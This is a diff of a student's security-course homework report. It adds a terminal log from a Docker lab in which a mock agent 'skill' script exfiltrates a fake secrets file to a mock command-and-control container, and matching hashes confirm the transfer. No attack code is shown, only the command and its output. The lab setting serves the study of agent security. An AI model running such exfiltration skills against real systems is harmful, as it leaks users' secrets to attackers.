@@ -2,7 +2,26 @@ report dump before we make the pdf
 
 TASK 1: 
 
-ASDFGHJKL
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ docker compose ps
+NAME         IMAGE           COMMAND                  SERVICE      CREATED          STATUS          PORTS
+agent-node   hw4-lab:local   "sleep infinity"         agent-node   29 seconds ago   Up 12 seconds   
+mock-c2      hw4-lab:local   "python /app/c2.py"      mock-c2      27 seconds ago   Up 11 seconds   0.0.0.0:8080->8080/tcp, [::]:8080->8080/tcp
+web-lab      hw4-lab:local   "python -m http.serv…"   web-lab      29 seconds ago   Up 13 seconds   0.0.0.0:8000->8000/tcp, [::]:8000->8000/tcp
+
+
+
+
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ docker compose exec agent-node /app/mock_skill.sh exfiltrate-course-file
+[mock-skill] Sending fake secret to mock-c2...
+
+[mock-skill] Exfiltration request completed.
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ docker compose exec mock-c2 ls -l /data/received.bin
+-rw-r--r-- 1 root root 35 Nov 20 19:08 /data/received.bin
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ docker compose exec agent-node sha256sum /app/fake_secrets.txt
+76c31395d3242ccfc90e48577ef877f799f7bcdf89f79a2600d9d678339e034a  /app/fake_secrets.txt
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ docker compose exec mock-c2 sha256sum /data/received.bin
+76c31395d3242ccfc90e48577ef877f799f7bcdf89f79a2600d9d678339e034a  /data/received.bin
+
 
 TASK 2:
 
